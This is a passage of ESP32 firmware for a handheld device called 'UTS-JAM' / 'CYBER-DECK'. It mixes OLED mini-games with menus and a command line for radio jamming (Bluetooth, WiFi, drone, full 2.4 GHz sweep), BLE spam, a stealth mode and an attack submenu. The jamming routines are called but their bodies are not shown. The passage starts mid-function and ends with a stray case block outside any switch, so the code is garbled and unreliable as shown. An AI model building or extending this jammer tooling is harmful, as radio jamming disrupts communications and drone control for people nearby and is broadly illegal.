  auto resetAliens = [&]() {
    for (int i = 0; i < 5; i++) {
      alienX[i] = 16 + i * 20; alienY[i] = 16; alienAlive[i] = true;
      alienX[i + 5] = 16 + i * 20; alienY[i + 5] = 26; alienAlive[i + 5] = true;
    }
  };
  resetAliens();

  displayInfo("Space Invaders", "UP:L DN:R SEL:Fire", "Hold SEL 5s: Exit");
  safeDelay(1200);

  while (true) {
    unsigned long frameStart = millis();

    if (checkGameExit()) {
      currentState = STATE_MENU;
      return;
    }

    if (alive) {
      if (upPressed())   playerX = max(4, playerX - 5);
      if (downPressed()) playerX = min(116, playerX + 5);

      if (selPressed() && bulletY < 0) {
        bulletX = playerX + 4;
        bulletY = 52;
      }

      if (bulletY >= 0) {
        bulletY -= 5;
        for (int i = 0; i < NUM_ALIENS; i++) {
          if (alienAlive[i]) {
            if (bulletX >= alienX[i] && bulletX <= alienX[i] + 10 &&
                bulletY >= alienY[i] && bulletY <= alienY[i] + 7) {
              alienAlive[i] = false;
              bulletY = -1;
              score += 20;
              if (score > highScore) {
                highScore = score;
                prefs.putInt("hi_inv", highScore);
              }
              break;
            }
          }
        }
        if (ufoX >= 0 && bulletY >= 10 && bulletY <= 16 && abs(bulletX - (ufoX + 6)) < 8) {
          score += 100;
          if (score > highScore) {
            highScore = score;
            prefs.putInt("hi_inv", highScore);
          }
          ufoX = -1;
          bulletY = -1;
        }
      }

      if (enemyBombY >= 0) {
        enemyBombY += 3;
        for (int b = 0; b < 3; b++) {
          if (bunkerHP[b] > 0 && enemyBombX >= bunkerX[b] && enemyBombX <= bunkerX[b] + 12 &&
              enemyBombY >= 46 && enemyBombY <= 50) {
            bunkerHP[b]--;
            enemyBombY = -1;
          }
        }
        if (enemyBombY >= 53 && abs(enemyBombX - (playerX + 5)) < 6) {
          enemyBombY = -1;
          lives--;
          if (lives <= 0) alive = false;
        }
        if (enemyBombY > 63) enemyBombY = -1;
      } else {
        int shooter = random(0, NUM_ALIENS);
        if (alienAlive[shooter]) {
          enemyBombX = alienX[shooter] + 4;
          enemyBombY = alienY[shooter] + 6;
        }
      }

      if (ufoX >= 0) {
        ufoX += 2;
        if (ufoX > 128) ufoX = -1;
      } else if (random(0, 120) == 0) {
        ufoX = 0;
      }

      alienMoveTimer++;
      if (alienMoveTimer > 7) {
        alienMoveTimer = 0;
        bool edgeHit = false;
        for (int i = 0; i < NUM_ALIENS; i++) {
          if (alienAlive[i]) {
            alienX[i] += alienDir * 3;
            if (alienX[i] <= 4 || alienX[i] >= 116) edgeHit = true;
            if (alienY[i] >= 48) alive = false;
          }
        }
        if (edgeHit) {
          alienDir = -alienDir;
          for (int i = 0; i < NUM_ALIENS; i++) alienY[i] += 4;
        }
      }

      bool allDead = true;
      for (int i = 0; i < NUM_ALIENS; i++) if (alienAlive[i]) allDead = false;
      if (allDead) {
        score += 150;
        if (score > highScore) {
          highScore = score;
          prefs.putInt("hi_inv", highScore);
        }
        resetAliens();
      }

      display.clearDisplay();
      drawHeader("Invaders");
      display.setCursor(0, 11); display.print("S:"); display.print(score);
      display.setCursor(45, 11); display.print("HI:"); display.print(highScore);
      display.setCursor(95, 11);
      for (int l = 0; l < lives; l++) display.print("<");

      if (ufoX >= 0) {
        display.fillRect(ufoX, 10, 12, 4, SSD1306_WHITE);
        display.fillRect(ufoX + 3, 9, 6, 2, SSD1306_WHITE);
      }

      for (int b = 0; b < 3; b++) {
        if (bunkerHP[b] > 0) {
          int bH = bunkerHP[b] * 2;
          display.fillRect(bunkerX[b], 48 - bH, 12, bH, SSD1306_WHITE);
        }
      }

      display.fillRect(playerX, 56, 10, 4, SSD1306_WHITE);
      display.fillRect(playerX + 4, 53, 2, 3, SSD1306_WHITE);

      if (bulletY >= 0) display.drawFastVLine(bulletX, bulletY, 3, SSD1306_WHITE);
      if (enemyBombY >= 0) display.drawPixel(enemyBombX, enemyBombY, SSD1306_WHITE);

      for (int i = 0; i < NUM_ALIENS; i++) {
        if (alienAlive[i]) {
          int ax = alienX[i], ay = alienY[i];
          display.fillRect(ax + 2, ay, 6, 5, SSD1306_WHITE);
          display.drawFastHLine(ax, ay + 2, 10, SSD1306_WHITE);
          display.drawPixel(ax + 3, ay + 2, SSD1306_BLACK);
          display.drawPixel(ax + 6, ay + 2, SSD1306_BLACK);
        }
      }

      drawExitProgress();
      display.display();
    } else {
      display.clearDisplay();
      drawHeader("GAME OVER");
      display.setCursor(20, 20); display.print("Score: "); display.print(score);
      display.setCursor(20, 30); display.print("High:  "); display.print(highScore);
      if (score > 0 && score == highScore) {
        display.setCursor(12, 40); display.print("* NEW HIGH SCORE! *");
      }
      display.setCursor(14, 52); display.print("UP: Retry  HOLD: Exit");
      drawExitProgress();
      display.display();

      if (upPressed()) {
        alive = true;
        score = 0;
        lives = 3;
        bulletY = -1;
        enemyBombY = -1;
        ufoX = -1;
        for (int b = 0; b < 3; b++) bunkerHP[b] = 3;
        resetAliens();
        safeDelay(200);
      }
    }

    unsigned long elapsed = millis() - frameStart;
    if (elapsed < 33) safeDelay(33 - elapsed);
    yield();
  }
  currentState = STATE_MENU;
}

// ------------------------------------------------------------
// 6. SUPER PONG
// ------------------------------------------------------------
void runPong() {
  int paddleY = 24, aiY = 24;
  float ballX = 64, ballY = 32;
  float velX = 2.4, velY = 1.4;
  int scoreP = 0, scoreAI = 0;
  int highScore = prefs.getInt("hi_pong", 0);

  displayInfo("Pong", "UP/DN:Move SEL:Smash", "Hold SEL 5s: Exit");
  safeDelay(1200);

  while (true) {
    unsigned long frameStart = millis();

    if (checkGameExit()) {
      currentState = STATE_MENU;
      return;
    }

    if (upPressed())   paddleY = max(11, paddleY - 4);
    if (downPressed()) paddleY = min(48, paddleY + 4);

    if (aiY + 8 < ballY - 2) aiY = min(48, aiY + 2);
    else if (aiY + 8 > ballY + 2) aiY = max(11, aiY - 2);

    ballX += velX;
    ballY += velY;

    if (ballY <= 12) { ballY = 12; velY = -velY; }
    if (ballY >= 60) { ballY = 60; velY = -velY; }

    if (ballX <= 9 && ballX >= 4) {
      if (ballY >= paddleY - 2 && ballY <= paddleY + 16) {
        ballX = 10;
        bool smash = (digitalRead(SELECT_BUTTON_PIN) == LOW);
        float boost = smash ? 1.25 : 1.05;
        velX = -velX * boost;
        if (velX > 4.8) velX = 4.8;
        velY += (ballY - (paddleY + 7)) * 0.20;
      }
    }

    if (ballX >= 118 && ballX <= 123) {
      if (ballY >= aiY - 2 && ballY <= aiY + 16) {
        ballX = 117;
        velX = -velX;
      }
    }

    if (ballX < 0) {
      scoreAI++;
      ballX = 64; ballY = 32;
      velX = 2.4; velY = (random(0, 2) == 0 ? 1.4 : -1.4);
      safeDelay(300);
    }
    if (ballX > 127) {
      scoreP++;
      if (scoreP > highScore) {
        highScore = scoreP;
        prefs.putInt("hi_pong", highScore);
      }
      ballX = 64; ballY = 32;
      velX = -2.4; velY = (random(0, 2) == 0 ? 1.4 : -1.4);
      safeDelay(300);
    }

    display.clearDisplay();
    drawHeader("Super Pong");
    display.setCursor(24, 11);
    display.print("YOU:"); display.print(scoreP);
    display.setCursor(76, 11);
    display.print("AI:"); display.print(scoreAI);

    for (int y = 11; y < 64; y += 4) display.drawFastVLine(64, y, 2, SSD1306_WHITE);

    display.fillRect(5, paddleY, 3, 14, SSD1306_WHITE);
    display.fillRect(120, aiY, 3, 14, SSD1306_WHITE);
    display.fillRect((int)ballX, (int)ballY, 3, 3, SSD1306_WHITE);

    drawExitProgress();
    display.display();

    unsigned long elapsed = millis() - frameStart;
    if (elapsed < 33) safeDelay(33 - elapsed);
    yield();
  }
}

// ------------------------------------------------------------
// 7. TIC-TAC-TOE (SMART MINIMAX DEFENSE AI)
// ------------------------------------------------------------
void runTicTacToe() {
  int board[9] = {0};
  int cursor = 4;
  int winner = 0;
  bool playerXTurn = true;

  displayInfo("Tic-Tac-Toe", "UP/DN:Move SEL:Place", "Hold SEL 5s: Exit");
  safeDelay(1200);

  auto checkWin = [&](int b[9]) {
    const int wins[8][3] = {
      {0,1,2},{3,4,5},{6,7,8},
      {0,3,6},{1,4,7},{2,5,8},
      {0,4,8},{2,4,6}
    };
    for (int i = 0; i < 8; i++) {
      if (b[wins[i][0]] != 0 &&
          b[wins[i][0]] == b[wins[i][1]] &&
          b[wins[i][1]] == b[wins[i][2]]) {
        return b[wins[i][0]];
      }
    }
    bool full = true;
    for (int i = 0; i < 9; i++) if (b[i] == 0) full = false;
    return full ? 3 : 0;
  };

  while (true) {
    if (checkGameExit()) {
      currentState = STATE_MENU;
      return;
    }

    if (winner == 0) {
      if (playerXTurn) {
        if (upPressed()) cursor = (cursor == 0) ? 8 : cursor - 1;
        if (downPressed()) cursor = (cursor + 1) % 9;
        if (selPressed()) {
          if (board[cursor] == 0) {
            board[cursor] = 1;
            winner = checkWin(board);
            playerXTurn = false;
          }
        }
      } else {
        safeDelay(250);
        int bestMove = -1;
        // 1. Try win
        for (int i = 0; i < 9; i++) {
          if (board[i] == 0) {
            board[i] = 2;
            if (checkWin(board) == 2) { bestMove = i; board[i] = 0; break; }
            board[i] = 0;
          }
        }
        // 2. Block player
        if (bestMove < 0) {
          for (int i = 0; i < 9; i++) {
            if (board[i] == 0) {
              board[i] = 1;
              if (checkWin(board) == 1) { bestMove = i; board[i] = 0; break; }
              board[i] = 0;
            }
          }
        }
        // 3. Center
        if (bestMove < 0 && board[4] == 0) bestMove = 4;
        // 4. Random open
        if (bestMove < 0) {
          for (int i = 0; i < 9; i++) if (board[i] == 0) { bestMove = i; break; }
        }
        if (bestMove >= 0) board[bestMove] = 2;
        winner = checkWin(board);
        playerXTurn = true;
      }
    }

    display.clearDisplay();
    if (winner == 0) drawHeader(playerXTurn ? "Your Turn (X)" : "AI Thinking...");
    else if (winner == 1) drawHeader("YOU WON! (X)");
    else if (winner == 2) drawHeader("AI WON! (O)");
    else drawHeader("DRAW GAME!");

    // Draw 3x3 Grid
    display.drawFastVLine(52, 14, 48, SSD1306_WHITE);
    display.drawFastVLine(76, 14, 48, SSD1306_WHITE);
    display.drawFastHLine(28, 30, 72, SSD1306_WHITE);
    display.drawFastHLine(28, 46, 72, SSD1306_WHITE);

    for (int i = 0; i < 9; i++) {
      int col = i % 3;
      int row = i / 3;
      int cx = 40 + col * 24;
      int cy = 22 + row * 16;

      if (board[i] == 1) {
        display.drawLine(cx - 5, cy - 5, cx + 5, cy + 5, SSD1306_WHITE);
        display.drawLine(cx - 5, cy + 5, cx + 5, cy - 5, SSD1306_WHITE);
      } else if (board[i] == 2) {
        display.drawCircle(cx, cy, 6, SSD1306_WHITE);
      }

      if (winner == 0 && cursor == i && playerXTurn) {
        display.drawRect(cx - 9, cy - 7, 19, 15, SSD1306_WHITE);
      }
    }

    if (winner != 0) {
      display.setCursor(14, 56);
      display.print("UP: Again  HOLD: Exit");
      if (upPressed()) {
        for (int i = 0; i < 9; i++) board[i] = 0;
        winner = 0;
        playerXTurn = true;
        cursor = 4;
        safeDelay(200);
      }
    }

    drawExitProgress();
    display.display();
    safeDelay(25);
    yield();
  }
}

// ------------------------------------------------------------
// 8. COIN RUSH & DRONE SURVIVAL
// ------------------------------------------------------------
void runHuntGame() {
  int px = 64, py = 32;
  int tx = random(12, 116), ty = random(18, 56);
  float droneX = 10, droneY = 10;
  int score = 0;
  int highScore = prefs.getInt("hi_coin", 0);
  int timeLeft = 35;
  unsigned long lastTimer = millis();
  bool alive = true;

  displayInfo("Coin Rush", "UP/DN:Move SEL:Warp", "Catch Coins! 35s");
  safeDelay(1200);

  while (timeLeft > 0 && alive) {
    unsigned long frameStart = millis();

    if (checkGameExit()) {
      currentState = STATE_MENU;
      return;
    }

    if (upPressed())   py = max(14, py - 4);
    if (downPressed()) py = min(58, py + 4);
    if (selPressed()) {
      px = (px + 18) % 120 + 4;
    } else {
      px = (px + 1);
      if (px > 122) px = 4;
    }

    float ddx = px - droneX;
    float ddy = py - droneY;
    float ddist = sqrt(ddx * ddx + ddy * ddy);
    if (ddist > 1.0) {
      droneX += (ddx / ddist) * 0.7;
      droneY += (ddy / ddist) * 0.7;
    }
    if (abs(px - (int)droneX) < 5 && abs(py - (int)droneY) < 5) {
      alive = false;
    }

    if (abs(px - tx) < 8 && abs(py - ty) < 8) {
      score += 10;
      if (score > highScore) {
        highScore = score;
        prefs.putInt("hi_coin", highScore);
      }
      tx = random(12, 116);
      ty = random(18, 56);
    }

    if (millis() - lastTimer >= 1000) {
      lastTimer = millis();
      timeLeft--;
    }

    display.clearDisplay();
    drawHeader("Coin Rush");
    display.setCursor(0, 11); display.print("S:"); display.print(score);
    display.setCursor(45, 11); display.print("HI:"); display.print(highScore);
    display.setCursor(85, 11); display.print("T:"); display.print(timeLeft);

    display.fillRect(tx, ty, 5, 5, SSD1306_WHITE);
    display.drawCircle(px, py, 4, SSD1306_WHITE);
    display.drawPixel(px, py, SSD1306_WHITE);

    int dx = (int)droneX, dy = (int)droneY;
    display.drawLine(dx - 3, dy - 3, dx + 3, dy + 3, SSD1306_WHITE);
    display.drawLine(dx - 3, dy + 3, dx + 3, dy - 3, SSD1306_WHITE);

    drawExitProgress();
    display.display();

    unsigned long elapsed = millis() - frameStart;
    if (elapsed < 33) safeDelay(33 - elapsed);
    yield();
  }

  display.clearDisplay();
  drawHeader(alive ? "TIME'S UP!" : "DRONE CAUGHT!");
  display.setCursor(20, 20); display.print("Score: "); display.print(score);
  display.setCursor(20, 30); display.print("Record: "); display.print(highScore);
  if (score > 0 && score == highScore) {
    display.setCursor(12, 40); display.print("* NEW HIGH SCORE! *");
  }
  display.setCursor(14, 52); display.print("UP: Play  HOLD: Exit");
  drawExitProgress();
  display.display();
  while (!checkGameExit()) {
    if (upPressed()) { runHuntGame(); return; }
    yield();
  }
  currentState = STATE_MENU;
}

// ------------------------------------------------------------
// 9. SIMON SYNTH PATTERN
// ------------------------------------------------------------
void runSimonGame() {
  int seq[30];
  int len = 0;
  int highScore = prefs.getInt("hi_simon", 0);
  bool gameOver = false;
  randomSeed(millis());

  displayInfo("Simon Synth", "UP:Top  DN:Bot  SEL:Mid", "Repeat Pattern!");
  safeDelay(1200);

  auto addNewStep = [&]() {
    if (len < 29) seq[len++] = random(0, 3);
  };
  addNewStep();

  while (!gameOver) {
    if (checkGameExit()) {
      currentState = STATE_MENU;
      return;
    }

    display.clearDisplay();
    drawHeader("Watch Pattern");
    display.setCursor(0, 11); display.print("Round: "); display.print(len);
    display.setCursor(70, 11); display.print("Best: "); display.print(highScore);
    display.display();
    safeDelay(500);

    for (int s = 0; s < len; s++) {
      if (checkGameExit()) return;
      display.clearDisplay();
      drawHeader("Watch Pattern");
      display.setCursor(0, 11); display.print("Round: "); display.print(len);

      int cy = (seq[s] == 0) ? 22 : (seq[s] == 1) ? 36 : 50;
      display.fillCircle(64, cy, 9, SSD1306_WHITE);
      display.drawCircle(64, cy, 14, SSD1306_WHITE);
      display.display();

      if (!stealthMode) digitalWrite(LED_PIN, HIGH);
      safeDelay(max(150, 400 - len * 15));
      digitalWrite(LED_PIN, LOW);

      display.clearDisplay();
      drawHeader("Watch Pattern");
      display.display();
      safeDelay(100);
    }

    display.clearDisplay();
    drawHeader("Your Turn!");
    display.setCursor(10, 26); display.print("UP:Top  SEL:Mid  DN:Bot");
    display.display();

    for (int s = 0; s < len; s++) {
      int inputVal = -1;
      while (inputVal < 0) {
        if (checkGameExit()) return;
        if (upPressed()) inputVal = 0;
        else if (selPressed()) inputVal = 1;
        else if (downPressed()) inputVal = 2;
        safeDelay(15);
      }

      int cy = (inputVal == 0) ? 22 : (inputVal == 1) ? 36 : 50;
      display.clearDisplay();
      drawHeader("Your Turn!");
      display.fillCircle(64, cy, 8, SSD1306_WHITE);
      display.display();
      safeDelay(120);

      if (inputVal != seq[s]) {
        gameOver = true;
        break;
      }
    }

    if (!gameOver) {
      if (len > highScore) {
        highScore = len;
        prefs.putInt("hi_simon", highScore);
      }
      display.clearDisplay();
      drawHeader("PERFECT!");
      display.setCursor(30, 30); display.print("NEXT LEVEL!");
      display.display();
      safeDelay(600);
      addNewStep();
    }
  }

  display.clearDisplay();
  drawHeader("GAME OVER");
  display.setCursor(20, 20); display.print("Rounds: "); display.print(len - 1);
  display.setCursor(20, 30); display.print("Best:   "); display.print(highScore);
  display.setCursor(14, 52); display.print("UP: Again  HOLD: Exit");
  drawExitProgress();
  display.display();
  while (!checkGameExit()) {
    if (upPressed()) { runSimonGame(); return; }
    yield();
  }
  currentState = STATE_MENU;
}

// ------------------------------------------------------------
// 10. VAULT SAFE CRACKER
// ------------------------------------------------------------
void runMemoryGame() {
  int target = random(1, 100);
  int guess = 50;
  int tries = 0;
  int bestTries = prefs.getInt("hi_vault", 99);
  String hint = "Crack the Vault!";
  bool won = false;

  displayInfo("Safe Cracker", "UP/DN:Dial  SEL:Try", "Hold SEL 5s: Exit");
  safeDelay(1200);

  while (!won) {
    if (checkGameExit()) {
      currentState = STATE_MENU;
      return;
    }

    if (upPressed())   guess = min(99, guess + 1);
    if (downPressed()) guess = max(1, guess - 1);

    if (selPressed()) {
      tries++;
      if (guess == target) {
        won = true;
      } else if (guess < target) {
        hint = "HIGHER! [^]";
      } else {
        hint = "LOWER!  [v]";
      }
    }

    display.clearDisplay();
    drawHeader("Vault Heist");
    display.setCursor(0, 11); display.print(hint);

    display.drawCircle(30, 38, 14, SSD1306_WHITE);
    int dialAngle = guess * 3.6;
    display.drawLine(30, 38, 30 + cos(dialAngle * 0.0174) * 11, 38 + sin(dialAngle * 0.0174) * 11, SSD1306_WHITE);

    display.setTextSize(2);
    display.setCursor(65, 26);
    if (guess < 10) display.print("0");
    display.print(guess);
    display.setTextSize(1);

    int diff = abs(target - guess);
    int heatW = map(constrain(50 - diff, 0, 50), 0, 50, 0, 50);
    display.drawRect(65, 44, 52, 6, SSD1306_WHITE);
    display.fillRect(66, 45, heatW, 4, SSD1306_WHITE);

    display.setCursor(0, 56); display.print("Tries: "); display.print(tries);
    display.setCursor(65, 56); display.print("SEL: Try");

    drawExitProgress();
    display.display();

    safeDelay(25);
    yield();
  }

  if (tries < bestTries) {
    bestTries = tries;
    prefs.putInt("hi_vault", bestTries);
  }

  display.clearDisplay();
  drawHeader("VAULT OPENED!");
  display.setCursor(16, 20); display.print("Code: "); display.print(target);
  display.setCursor(16, 32); display.print("Tries: "); display.print(tries);
  display.setCursor(75, 32); display.print("Best: "); display.print(bestTries);
  display.setCursor(14, 50); display.print("UP: Again  HOLD: Exit");
  drawExitProgress();
  display.display();
  while (!checkGameExit()) {
    if (upPressed()) { runMemoryGame(); return; }
    yield();
  }
  currentState = STATE_MENU;
}



// ============================================================
// CLI (DÜZELTİLDİ)
// ============================================================
void runCLI() {
  String cmd = "";
  const char* commands[] = {"help", "info", "jam", "stop", "spam", "wifi", "scan", "exit"};
  int sel = 0;
  const int numCmds = 8;
  while (true) {
    display.clearDisplay();
    String hdr = "CLI - " + cmd;
    drawHeader(hdr);               // String overload kullanılıyor
    int start = max(0, sel - 3);
    for (int i = 0; i < 5 && start + i < numCmds; i++) {
      display.setCursor(0, 12 + i * 10);
      if (start + i == sel) display.print("> ");
      else display.print("  ");
      display.print(commands[start + i]);
    }
    display.display();
    if (upPressed()) sel = (sel == 0) ? numCmds - 1 : sel - 1;
    if (downPressed()) sel = (sel + 1) % numCmds;
    if (selPressed()) {
      String c = commands[sel];
      if (c == "help") { displayInfo("CLI Help", "Use up/dn", "SEL to exec"); safeDelay(1500); }
      else if (c == "info") { displayInfo("Info", "UTS-JAM v5.1", "ESP32-C3"); safeDelay(1500); }
      else if (c == "jam") {
        displayInfo("Jamming", "5s");
        initRadios();
        unsigned long s = millis();
        displayInfo("Jamming", "Disabled"); safeDelay(1000);
        initRadios();
      }
      else if (c == "stop") { stopRadios(); displayInfo("Stopped"); safeDelay(1000); }
      else if (c == "spam") { runBLESpam(); }
      else if (c == "wifi") {
        displayInfo("WiFi", "Scanning");
        WiFi.mode(WIFI_STA);
        int n = WiFi.scanNetworks();
        displayInfo("Found", String(n));
        safeDelay(1500);
      }
      else if (c == "scan") { runBLEScanner(); }
      else if (c == "exit") { break; }
    }
    yield();
  }
  currentState = STATE_MENU;
}

// ============================================================
// WEB DASHBOARD (DÜZELTİLDİ - lambda capture)
// ============================================================
void runWebDashboard() {
  WiFi.mode(WIFI_AP);
  WiFi.softAP("UTS-JAM", "12345678");
  WebServer server(80);
  server.on("/", [&server]() {                 // <-- DÜZELTME: capture
    server.send(200, "text/html",
      "<html><body style='font-family:Arial;text-align:center;'>"
      "<h1>UTS-JAM Dashboard</h1><p>Status: <b>Online</b></p>"
      "<p>Firmware: v5.1 ULTIMATE</p></body></html>");
  });
  server.begin();
  displayInfo("WebDash", "AP: UTS-JAM", "IP: " + WiFi.softAPIP().toString(), "SEL to stop");
  while (!selPressed()) {
    server.handleClient();
    yield();
  }
  server.stop();
  WiFi.softAPdisconnect(true);
  recoverFromWiFi();
}

// ============================================================
// SETTINGS / HELP / LOCK
// ============================================================
void showSettings() {
  int sel = 0;
  const char* opts[] = {"Brightness", "StealthMode", "LED Test", "Back"};
  while (true) {
    display.clearDisplay();
    drawHeader("Settings");
    for (int i = 0; i < 4; i++) {
      display.setCursor(0, 12 + i * 10);
      display.print(sel == i ? "> " : "  ");
      display.print(opts[i]);
    }
    display.display();
    if (upPressed()) sel = (sel == 0) ? 3 : sel - 1;
    if (downPressed()) sel = (sel + 1) % 4;
    if (selPressed()) {
      if (sel == 0) {
        uint8_t b = brightness;
        while (!selPressed()) {
          displayInfo("Brightness", String(b), "UP/DN");
          if (upPressed()) { b = min(255, b + 10); setBrightness(b); }
          if (downPressed()) { b = max(10, b - 10); setBrightness(b); }
          yield();
        }
        prefs.putUChar("bright", b);
      } else if (sel == 1) {
        stealthMode = !stealthMode;
        displayInfo("Stealth", stealthMode ? "ON" : "OFF");
        safeDelay(1000);
      } else if (sel == 2) {
        digitalWrite(LED_PIN, HIGH); safeDelay(500); digitalWrite(LED_PIN, LOW);
      } else break;
    }
    yield();
  }
  currentState = STATE_MENU;
}

void showHelp() {
  int page = 0;
  while (!gameShouldExit()) {
    display.clearDisplay();
    if (page == 0) {
      drawHeader("HELP: Controls [1/2]");
      display.setCursor(2, 13); display.print("[UP]   : Nav / Jump / Walk");
      display.setCursor(2, 23); display.print("[DOWN] : Nav / Duck / Spin");
      display.setCursor(2, 33); display.print("[SEL]  : Action / Fire");
      display.setCursor(2, 43); display.print("HOLD SEL 5s: Exit Tool");
      display.setCursor(2, 54); display.print("UP/DN: Next  HOLD: Exit");
    } else {
      drawHeader("HELP: Tips [2/2]");
      display.setCursor(2, 13); display.print("- Dual NRF radios boost");
      display.setCursor(2, 23); display.print("  scanning/analyzer speed");
      display.setCursor(2, 33); display.print("- Doom 3D: UP walk,");
      display.setCursor(2, 43); display.print("  DN turn, SEL shotgun");
      display.setCursor(2, 54); display.print("UP/DN: Prev  HOLD: Exit");
    }
    drawExitProgress();
    display.display();
    if (upPressed() || downPressed()) {
      page = 1 - page;
      safeDelay(150);
    }
    safeDelay(20);
  }
  currentState = STATE_MENU;
}

void runLock() {
  display.clearDisplay();
  drawHeader("DEVICE LOCKED");
  display.drawRect(56, 24, 16, 14, SSD1306_WHITE);
  display.drawCircle(63, 21, 5, SSD1306_WHITE);
  display.drawFastHLine(59, 24, 9, SSD1306_BLACK);
  display.fillRect(62, 29, 4, 4, SSD1306_WHITE);
  display.setCursor(18, 44);
  display.print("HOLD SEL 5s UNLOCK");
  display.display();

  while (!gameShouldExit()) {
    display.clearDisplay();
    drawHeader("DEVICE LOCKED");
    display.drawRect(56, 24, 16, 14, SSD1306_WHITE);
    display.drawCircle(63, 21, 5, SSD1306_WHITE);
    display.drawFastHLine(59, 24, 9, SSD1306_BLACK);
    display.fillRect(62, 29, 4, 4, SSD1306_WHITE);
    display.setCursor(18, 44);
    display.print("HOLD SEL 5s UNLOCK");
    drawExitProgress();
    display.display();
    safeDelay(20);
  }
  currentState = STATE_MENU;
}

// ============================================================
// MENU RENDERING
// ============================================================
void drawMainMenu() {
  display.clearDisplay();
  drawHeader("CYBER-DECK v5.3");
  const int visible = 4;
  for (int i = 0; i < visible; i++) {
    int idx = (firstVisibleMain + i) % NUM_MAIN_ITEMS;
    int y = 13 + i * 12;
    bool isSel = (selectedMain == idx);
    if (isSel) {
      display.fillRoundRect(1, y - 1, SCREEN_WIDTH - 8, 11, 2, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
      display.fillTriangle(SCREEN_WIDTH - 14, y + 2, SCREEN_WIDTH - 14, y + 8, SCREEN_WIDTH - 11, y + 5, SSD1306_BLACK);
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    display.drawBitmap(4, y + 1, mainMenuIcons[idx], 8, 8, isSel ? SSD1306_BLACK : SSD1306_WHITE);
    display.setCursor(16, y + 2);
    display.print(mainMenuLabels[idx]);
  }
  drawScrollbar(selectedMain, NUM_MAIN_ITEMS, 13, 48);
  display.display();
}

void drawSubMenu() {
  if (!currentSubMenu) return;
  display.clearDisplay();
  drawHeader(currentSubMenu->title);
  const int visible = 4;
  int total = currentSubMenu->items.size();
  for (int i = 0; i < visible; i++) {
    int idx = subFirstVisible + i;
    if (idx >= total) break;
    int y = 13 + i * 12;
    bool isSel = (subSelectedIndex == idx);
    if (isSel) {
      display.fillRoundRect(1, y - 1, SCREEN_WIDTH - 8, 11, 2, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
      display.fillTriangle(SCREEN_WIDTH - 14, y + 2, SCREEN_WIDTH - 14, y + 8, SCREEN_WIDTH - 11, y + 5, SSD1306_BLACK);
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    // Render 8x8 submenu item icon
    if (currentSubMenu->items[idx].icon) {
      display.drawBitmap(4, y + 1, currentSubMenu->items[idx].icon, 8, 8, isSel ? SSD1306_BLACK : SSD1306_WHITE);
    }
    display.setCursor(16, y + 2);
    display.print(currentSubMenu->items[idx].label);
  }
  drawScrollbar(subSelectedIndex, total, 13, 48);
  display.display();
}

void handleMainMenu() {
  if (upPressed()) {
    if (selectedMain == 0) {
      selectedMain = static_cast<MainMenuItem>(NUM_MAIN_ITEMS - 1);
      firstVisibleMain = NUM_MAIN_ITEMS - 4;
    } else {
      selectedMain = static_cast<MainMenuItem>(selectedMain - 1);
      if (selectedMain < firstVisibleMain) firstVisibleMain = selectedMain;
    }
    drawMainMenu();
  } else if (downPressed()) {
    selectedMain = static_cast<MainMenuItem>((selectedMain + 1) % NUM_MAIN_ITEMS);
    if (selectedMain == 0) firstVisibleMain = 0;
    else if (selectedMain >= firstVisibleMain + 4) firstVisibleMain = selectedMain - 3;
    drawMainMenu();
  } else if (selPressed()) {
    switch (selectedMain) {
      case MENU_JAMMERS:  currentSubMenu = &subJammers;  currentState = STATE_SUBMENU_JAMMERS;  break;
      case MENU_ANALYZERS:currentSubMenu = &subAnalyzers;currentState = STATE_SUBMENU_ANALYZERS;break;
      case MENU_ATTACKS:  currentSubMenu = &subAttacks;  currentState = STATE_SUBMENU_ATTACKS;  break;
      case MENU_TOOLS:    currentSubMenu = &subTools;    currentState = STATE_SUBMENU_TOOLS;    break;
      case MENU_GAMES:    currentSubMenu = &subGames;    currentState = STATE_SUBMENU_GAMES;    break;
      case MENU_SETTINGS: currentSubMenu = &subSettings; currentState = STATE_SUBMENU_SETTINGS; break;
      case MENU_HELP:     showHelp(); currentState = STATE_MENU; break;
      case MENU_CLI:      runCLI();   currentState = STATE_MENU; break;
      case MENU_LOCK:     runLock();  currentState = STATE_MENU; break;
      default: break;
    }
    subFirstVisible = 0;
    subSelectedIndex = 0;
    if (currentState != STATE_MENU) drawSubMenu();
  }
}

void handleSubMenu() {
  if (!currentSubMenu) { currentState = STATE_MENU; return; }
  int total = currentSubMenu->items.size();
  if (upPressed()) {
    if (subSelectedIndex == 0) {
      subSelectedIndex = total - 1;
      subFirstVisible = max(0, total - 4);
    } else {
      subSelectedIndex--;
      if (subSelectedIndex < subFirstVisible) subFirstVisible = subSelectedIndex;
    }
    drawSubMenu();
  } else if (downPressed()) {
    subSelectedIndex = (subSelectedIndex + 1) % total;
    if (subSelectedIndex >= subFirstVisible + 4) subFirstVisible = subSelectedIndex - 3;
    drawSubMenu();
  } else if (selPressed()) {
    AppState target = currentSubMenu->items[subSelectedIndex].targetState;
    currentSubMenu = nullptr;
    executeState(target);
  }
}

    case STATE_BT_JAM:
      displayInfo("BT Jam", "Init radios...");
      initRadios();
      jamPrepareRadios();
      displayInfo("BT Jam v6", "BLE adv + BT cl", "SEL to stop");
      while (!selPressed()) {
        btJam();
        if (checkGameExit()) break;
        yield();
      }
      initRadios(); break;

    case STATE_DRONE_JAM:
      displayInfo("Drone Jam", "Init radios...");
      initRadios();
      jamPrepareRadios();
      displayInfo("Drone Jam v6", "2400-2483 sweep", "SEL to stop");
      while (!selPressed()) {
        droneJam();
        if (checkGameExit()) break;
        yield();
      }
      initRadios(); break;

    case STATE_WIFI_JAM:
      displayInfo("WiFi Jam", "Init radios...");
      initRadios();
      jamPrepareRadios();
      displayInfo("WiFi Jam v6", "Dual CH 1/6/11", "SEL to stop");
      while (!selPressed()) {
        wifiJam();
        if (checkGameExit()) break;
        yield();
      }
      initRadios(); break;

    case STATE_MULTI_JAM:
      displayInfo("Multi Jam", "Init radios...");
      initRadios();
      jamPrepareRadios();
      displayInfo("Multi Jam v6", "BT + WiFi", "SEL to stop");
      while (!selPressed()) {
        multiJam();
        if (checkGameExit()) break;
        yield();
      }
      initRadios(); break;

    case STATE_SWEEP_JAM:
      displayInfo("Sweep Jam", "Init radios...");
      initRadios();
      jamPrepareRadios();
      displayInfo("Sweep v6", "Full band 180°", "SEL to stop");
      while (!selPressed()) {
        sweepJam();
